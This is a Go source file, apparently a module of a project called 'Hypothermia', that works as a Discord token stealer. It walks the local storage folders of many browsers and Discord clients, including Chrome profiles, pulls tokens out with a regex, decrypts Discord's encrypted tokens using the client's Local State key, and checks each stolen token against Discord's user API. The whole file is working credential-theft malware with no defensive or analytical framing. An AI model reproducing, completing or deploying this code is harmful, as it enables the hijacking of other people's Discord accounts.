package utils_grabber

import (
	"bufio"
	"encoding/base64"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"Hypothermia/src/utils"
)

const (
	userURL string = "https://discord.com/api/v9/users/@me"

	browser string = `[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}`
	discord string = `dQw4w9WgXcQ:[^"]*`
)

var (
	roaming string = os.Getenv("APPDATA")
	appdata string = os.Getenv("LOCALAPPDATA")

	chromeRoot string = filepath.Join(appdata, "Google\\Chrome\\User Data")
)

var browsersPaths = []string{
	filepath.Join(roaming, "Opera Software\\Opera Stable\\Local Storage\\leveldb"),
	filepath.Join(roaming, "Opera Software\\Opera GX Stable\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Amigo\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Torch\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Kometa\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Orbitum\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "CentBrowser\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "7Star\\7Star\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Vivaldi\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Google\\Chrome SxS\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Epic Privacy Browser\\User Data\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"),
	filepath.Join(appdata, "Iridium\\User Data\\Default\\Local Storage\\leveld"),
	filepath.Join(appdata, "CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb"),
}

var discordPaths = map[string]string{
	"discord":       filepath.Join(roaming, "discord\\Local Storage\\leveldb"),
	"discordcanary": filepath.Join(roaming, "discordcanary\\Local Storage\\leveldb"),
	"lightcord":     filepath.Join(roaming, "Lightcord\\Local Storage\\leveldb"),
	"discordptb":    filepath.Join(roaming, "discordptb\\Local Storage\\leveldb"),
}

func GrabDiscord() []string {
	setProfiles()

	var tokens []string
	browserRegex := regexp.MustCompile(browser)
	discordRegex := regexp.MustCompile(discord)

	for _, path := range browsersPaths {
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			fileName := file.Name()

			if !strings.HasSuffix(fileName, ".log") && !strings.HasSuffix(fileName, ".ldb") {
				continue
			}

			filePath := filepath.Join(path, fileName)
			file, err := os.Open(filePath)
			if err != nil {
				continue
			}

			defer file.Close()

			scanner := bufio.NewScanner(file)
			scanner.Buffer(make([]byte, 512*1024), 512*1024)

			for scanner.Scan() {
				line := scanner.Text()
				matches := browserRegex.FindAllString(line, -1)

				tokens = append(tokens, matches...)
			}
		}
	}

	for name, path := range discordPaths {
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			fileName := file.Name()

			if !strings.HasSuffix(fileName, ".log") && !strings.HasSuffix(fileName, ".ldb") {
				continue
			}

			filePath := filepath.Join(path, fileName)
			file, err := os.Open(filePath)
			if err != nil {
				continue
			}

			defer file.Close()

			scanner := bufio.NewScanner(file)
			scanner.Buffer(make([]byte, 512*1024), 512*1024)

			for scanner.Scan() {
				line := scanner.Text()
				matches := discordRegex.FindAllString(line, -1)

				password, err := utils.GetPassword(filepath.Join(roaming, name, "Local State"))
				if err != nil {
					continue
				}

				for _, match := range matches {
					split := strings.Split(match, "dQw4w9WgXcQ:")[1]
					decoded, err := base64.StdEncoding.DecodeString(split)
					if err != nil {
						continue
					}

					token, err := utils.DecryptWithPassword([]byte(decoded), password)
					if err != nil {
						continue
					}

					tokens = append(tokens, token)
				}
			}
		}
	}

	return tokens
}

func ValidateToken(token string) int {
	req, err := http.NewRequest("GET", userURL, nil)
	if err != nil {
		return -2
	}

	req.Header.Set("Authorization", token)

	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		return -2
	}

	defer res.Body.Close()

	return res.StatusCode
}

func setProfiles() {
	files, err := os.ReadDir(chromeRoot)
	if err != nil {
		return
	}

	for _, profile := range files {
		if profile.IsDir() && strings.HasPrefix(profile.Name(), "Profile ") {
			profilePath := filepath.Join(chromeRoot, profile.Name(), "Local Storage\\leveldb")
			browsersPaths = append(browsersPaths, profilePath)
		}
	}
}
